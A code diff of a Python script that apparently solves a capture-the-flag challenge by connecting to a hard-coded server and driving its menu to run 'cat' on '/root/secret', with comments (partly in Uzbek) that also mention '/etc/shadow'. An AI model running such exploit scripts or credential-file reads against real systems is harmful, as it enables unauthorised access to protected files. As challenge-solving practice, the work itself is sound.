@@ -5,44 +5,54 @@ def solve():
     host = '154.57.164.68'
     port = 31363
 
-    # Serverga ulanish
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(10)
+    s.settimeout(5)
     
     try:
-        print(f"[*] Connecting to {host}:{port}...")
         s.connect((host, port))
         
-        def send_payload(data):
-            s.sendall(data.encode() + b'\n')
-            time.sleep(0.5) # Serverga qabul qilish uchun vaqt beramiz
+        def wait_and_send(payload):
+            # Serverdan savol kelishini kutamiz
+            chunk = b""
+            while b"> " not in chunk:
+                try:
+                    data = s.recv(1024)
+                    if not data: break
+                    chunk += data
+                except:
+                    break
+            print(f"Server: {chunk.decode(errors='ignore').strip()}")
+            print(f"Sending: {payload}")
+            s.sendall(payload.encode() + b'\n')
+            time.sleep(0.3)
 
-        # 1-qadam: Mode -1
-        send_payload("1")
-        send_payload("-1")
+        # 1. Mode
+        wait_and_send("1")
+        wait_and_send("-1")
 
-        # 2-qadam: Bin (ls yoki cat - ikkalasi ham 2-3 harf)
-        send_payload("2")
-        send_payload("ls")
+        # 2. Bin
+        wait_and_send("2")
+        wait_and_send("cat")
 
-        # 3-qadam: Argumentlar (turli exit kodlar olish uchun)
-        # Maqsad: rc=1 va rc=2
-        # 'ls .' (rc=0), 'ls /root' (rc=2/1), 'ls /nonexistent' (rc=2)
-        send_payload("3")
-        send_payload("/root,/nonexistent")
+        # 3. Arguments
+        # Bizga debug[0] != debug[1] kerak. 
+        # 'cat .' (rc=1), 'cat /etc/shadow' (rc=1) bo'lib qolishi mumkin.
+        # Shuning uchun 'cat' va 'ls'ni aralashtirib ko'ramiz yoki:
+        wait_and_send("3")
+        # 'cat' ga bitta papka va bitta mavjud bo'lmagan fayl beramiz
+        wait_and_send(".,/root/secret") 
 
-        # 4-qadam: Switchlar (minus taqiqlangan, shuning uchun nuqta)
-        send_payload("4")
-        send_payload(".,.")
+        # 4. Switches
+        wait_and_send("4")
+        wait_and_send(".,.")
 
-        # 5-qadam: G'alaba shartini tekshirish
-        send_payload("5")
+        # 5. Execute
+        wait_and_send("5")
 
-        # Natijani kutish va chop etish
-        time.sleep(2)
-        response = s.recv(4096).decode()
-        print("[+] Server Response:")
-        print(response)
+        # Flagni kutish
+        time.sleep(1)
+        print("\n[+] Final Output:")
+        print(s.recv(4096).decode(errors='ignore'))
 
     except Exception as e:
         print(f"[!] Error: {e}")
